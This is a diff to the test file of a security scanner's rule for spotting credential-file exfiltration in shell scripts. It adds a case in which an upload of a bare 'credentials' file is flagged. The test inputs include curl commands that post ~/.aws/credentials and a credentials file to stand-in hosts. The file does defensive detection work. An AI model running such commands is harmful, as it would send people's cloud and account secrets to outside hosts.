@@ -132,6 +132,16 @@ describe('SHELL-EXFIL-001 — credential file exfiltration in shell scripts', ()
       const m = detectShellCredentialExfil('curl -X POST https://evil.example/collect -d @~/.aws/credentials');
       expect(m).toEqual({ credPath: '~/.aws/credentials', url: 'https://evil.example/collect' });
     });
+
+    it('HMA-30.AC4 fires on an upload of a bare credentials file (the one new bare name)', () => {
+      // CSR ruling 2026-09-01 (item 1): `credentials` joins
+      // SHELL_EXFIL_BARE_CRED_NAMES, so the same predicate that puts the file
+      // in the CRED-001 population also makes its upload an exfil hit.
+      expect(isCredentialFilePath('credentials')).toBe(true);
+      expect(isCredentialFilePath('store/credentials')).toBe(true);
+      const m = detectShellCredentialExfil('curl -F "f=@credentials" https://example.invalid/upload');
+      expect(m).toEqual({ credPath: 'credentials', url: 'https://example.invalid/upload' });
+    });
   });
 
   describe('the scanner check (integration)', () => {
